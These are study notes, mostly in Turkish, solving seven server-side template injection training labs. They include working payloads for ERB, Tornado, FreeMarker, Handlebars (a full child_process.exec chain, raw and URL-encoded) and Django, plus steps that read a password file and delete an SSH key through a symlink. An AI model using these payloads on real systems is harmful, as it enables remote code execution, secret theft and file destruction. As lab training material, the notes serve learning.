#### 1.Lab: Basic server-side template injection

- Sayfada bir itemden kalmadığında URL de mesaj özelliği çalışıyor
- Mesaj özelliği bir input alabiliyor
- URL'de linux komutları girerek işemler gerçekleştirebiliyoruz
- önce hatalı bir ifade girdirerek yanlış ruby bir sistem olduğunu görüyoruz
- ardından `<%= system('ls') %>` ile dosyaları taratıyoruz
- `<%= system('rm morale.txt') %>` ile de istenen dosyayı siliyoruz

#### 2.Lab: Basic server-side template injection (code context)

Labda tornado syntax kullanarak morale.txt dosyasının silinmesi gerektiği söylenmiş lakin denediğim payload payloadsallthethings payload'larına hiç benzemiyor.

- Yapılması gereken en önemli şey doğru syntax bulmak
- Önce bize verilen credentials ile giriş yapıyoruz
- Hesap sayfasında preferred name özelliğinde bir seçenek ile istek yolluyoruz
- Burp te bu isteği repeater'a yolluyoruz
- Syntax ları burada deneyeceğiz
- Valid Tornado SSSTI syntax : `''; import os; os.system('rm morale.txt')`
- Bu isteği attıktan sonra blogdaki postlardan birine yorum atıyoruz
- Postun olduğu blog sayfasını tekrar istediğimizde preferred name değerimiz çağırılacak
- çalıştırılacak bu nedenle de morale.txt silinmiş olacak.

#### 3.Lab: Server-side template injection using documentation

- Labda verilen credentials ile giriş yapıyoruz, bu bize product templatelarını editleme imkanı sağlıyor
- bir postun edit kısmına girdiğimizde ${product.price} gibi bir ifade görüyoruz bu bize template syntax'ının java tabanlı olabileceğini işaret ediyor
- Test için bir ifade deniyoruz: `${T(java.lang.Runtime).getRuntime().exec('ls')}`
- bu bize bir hata dönecek, hatada da freemaker eksik olduğunu söyleyecek syntax da
- bundan dolayı da template freemaker kullandığını anlayacağız
-  `${"freemarker.template.utility.Execute"?new()("rm morale.txt")}` yazarak labı çözüyoruz


#### 4.Lab: Server-side template injection in an unknown language with a documented exploit

- Labda handlebars kullanılıyor
- Yanlış syntax yazınca hata dönmemesi bunu gösteriyor
```
{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```
- yukarıdaki fadeyi URL encode ediyoruz:
```
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.push%20%28lookup%20string.sub%20%22constructor%22%29%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%7B%7B%23with%20string.split%20as%20%7Ccodelist%7C%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.push%20%22return%20require%28%27child_process%27%29.exec%28%27rm%20%2Fhome%2Fcarlos%2Fmorale.txt%27%29%3B%22%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string.sub.apply%200%20codelist%29%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%7B%7B%2Fwith%7D%7D%0A%7B%7B%2Fwith%7D%7D
```
- bu ifadeyi de URL'in sonuna eklediğimizde lab çözülüyor

#### 5.Lab: Server-side template injection with information disclosure via user-supplied objects


Bu labda obje çağrısı yaparak cevap bulmaya çalışıyoruz
- Sitedeki postlarda template değiştirmek istediğimizde `{{product.price}}` şeklinde bir ifade göreceğiz
- Bu ifade bize template hakkında bir fikir verecek, ilk bakışta django, tornado, java, js vb. gibi görünüyor.
- Hatalı bir python ifadesi girdiğimizde hatada template'ın django olduğunu görebiliyoruz.
- PayloadsAllTheThings den baktığımızda `{% debug %}` gibi bir ifade görüyoruz
- Bu bize kullanılan nesneleri dönecek
- Nesnelerin arasında `settings nesnesini görüyoruz`
- Django docs baktığımızda bu nesnenin muhtemel property lerinden birinin de SECRET_KEY olduğunu görüyoruz
- Template'in içine `{{settings.SECRET_KEY}}` yazdığımızda secret key bulacağız 

#### 6.Lab: Server-side template injection in a sandboxed environment

PayloadsAllTheThings den freemaker için bir payload buldum

```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
Convert the returned bytes to ASCII
```

#### 7.Lab: Server-side template injection with a custom exploit


The objective is to delete the file: /.ssh/id_rsa from the home directory of carlos
- There is an SSTI vulnerability in the preferred name feature
- To exploit this we need to write something the application can process
- We first try to uplaod an invalid file to see if the application's error message reveals anything
- The error message:
```
PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: application/octet-stream in /home/carlos/User.php:28
Stack trace:
#0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/hello.htac...', 'application/oct...')
#1 {main}
  thrown in /home/carlos/User.php on line 28
```
- From this message we obtain 2 key information : the directory for Carlos, that there is a 'User.php' file and that there is a user.setAvater function that sets the user's avatar
- We send a request that sets the preferred name and we intercept it to perform some changes on it
- We set the `blog-post-author-display` to `user.setAvatar('/home/carlos/User.php','image/jpg')` this is the first step in reading the contents of User.php
- Afterwards we go to a post and submit a comment so that our preferred name is called which is user.setAvatar(...) in this case.
- We see that there is a request that calls our avatar when we request the post page
- The content of User.php which is our avatar is as follows:

```PHP
<?php

class User {
    public $username;
    public $name;
    public $first_name;
    public $nickname;
    public $user_dir;

    public function __construct($username, $name, $first_name, $nickname) {
        $this->username = $username;
        $this->name = $name;
        $this->first_name = $first_name;
        $this->nickname = $nickname;
        $this->user_dir = "users/" . $this->username;
        $this->avatarLink = $this->user_dir . "/avatar";

        if (!file_exists($this->user_dir)) {
            if (!mkdir($this->user_dir, 0755, true))
            {
                throw new Exception("Could not mkdir users/" . $this->username);
            }
        }
    }

    public function setAvatar($filename, $mimetype) {
        if (strpos($mimetype, "image/") !== 0) {
            throw new Exception("Uploaded file mime type is not an image: " . $mimetype);
        }

        if (is_link($this->avatarLink)) {
            $this->rm($this->avatarLink);
        }

        if (!symlink($filename, $this->avatarLink)) {
            throw new Exception("Failed to write symlink " . $filename . " -> " . $this->avatarLink);
        }
    }

    public function delete() {
        $file = $this->user_dir . "/disabled";
        if (file_put_contents($file, "") === false) {
            throw new Exception("Could not write to " . $file);
        }
    }

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }

    private function rm($filename) {
        if (!unlink($filename)) {
            throw new Exception("Could not delete " . $filename);
        }
    }
}

?>
```

- We notice a `gdprDelete()` function that deletes the user's avatar
- We already know that we can set an arbitrary file in the application as an avatar, we already know how to call a certain function, and we now know that we can delete a user's avatar
- The procedure is to set the `/home/carlos/.ssh/id_rsa` file as an avatar and then delete it with `gdprDelete()`
- We send the request `POST /my-account/change-blog-post-author-display`request and set it's `blog-post-author-display` to `user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')`
- Then we request the post page:`GET /post?postId=3 HTTP/2` to run the function 
- Now that the file is set as the avatar, we send the preferred name request name again and set it to execute `user.gdprDelete()`
- We request the post page again and with this request the file now is deleted.